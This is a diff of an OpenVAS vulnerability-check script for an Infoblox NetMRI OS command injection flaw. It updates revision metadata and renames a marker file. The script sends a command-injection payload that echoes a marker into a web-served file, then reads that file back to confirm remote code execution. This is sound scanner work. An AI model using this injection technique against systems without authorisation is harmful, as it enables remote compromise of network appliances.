@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_netmri_os_cmd_injec_07_14.nasl 11306 2018-09-10 14:58:09Z mmartin $
+# $Id: gb_netmri_os_cmd_injec_07_14.nasl 11497 2018-09-20 10:31:54Z mmartin $
 #
 # Infoblox NetMRI OS Command Injection Vulnerability
 #
@@ -33,7 +33,7 @@ if(description)
   script_cve_id("CVE-2014-3418", "CVE-2014-3419");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_version("$Revision: 11306 $");
+  script_version("$Revision: 11497 $");
 
   script_name("Infoblox NetMRI OS Command Injection Vulnerability");
 
@@ -41,7 +41,7 @@ if(description)
   script_xref(name:"URL", value:"http://packetstormsecurity.com/files/127409/Infoblox-6.8.4.x-OS-Command-Injection.html");
   script_xref(name:"URL", value:"http://www.infoblox.com/");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-09-10 16:58:09 +0200 (Mon, 10 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-20 12:31:54 +0200 (Thu, 20 Sep 2018) $");
   script_tag(name:"creation_date", value:"2014-07-15 14:33:34 +0200 (Tue, 15 Jul 2014)");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
@@ -63,15 +63,18 @@ if(description)
 
 include("http_func.inc");
 include("host_details.inc");
+include("misc_func.inc");
+
 
 if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
 useragent = get_http_user_agent();
 host = http_host_name(port:port);
 
-check = 'openvas_' + rand();
+vtstring = get_vt_string( lowercase:TRUE );
+check = vtstring + '_' + rand();
 bound = rand();
 
-payload = 'echo ' + check  + ' > /var/home/tools/skipjack/app/webui/OpenVAS_RCE_Check.txt';
+payload = 'echo ' + check  + ' > /var/home/tools/skipjack/app/webui/RCE_Check.txt';
 
 data = '-----------------------------' + bound  + '\r\n' +
       'Content-Disposition: form-data; name="_formStack"\r\n' +
@@ -122,9 +125,9 @@ req = 'POST /netmri/config/userAdmin/login.tdf HTTP/1.1\r\n' +
 
 result = http_send_recv( port:port, data:req, bodyonly:FALSE );
 
-if( ! result || result !~ "HTTP/1.. 200" ) exit( 0 );
+if( ! result || result !~ "^HTTP/1\.[01] 200" ) exit( 0 );
 
-url = '/webui/OpenVAS_RCE_Check.txt';
+url = '/webui/RCE_Check.txt';
 req1 = http_get( item:url, port:port );
 buf = http_send_recv( port:port, data:req1, bodyonly:FALSE );
 
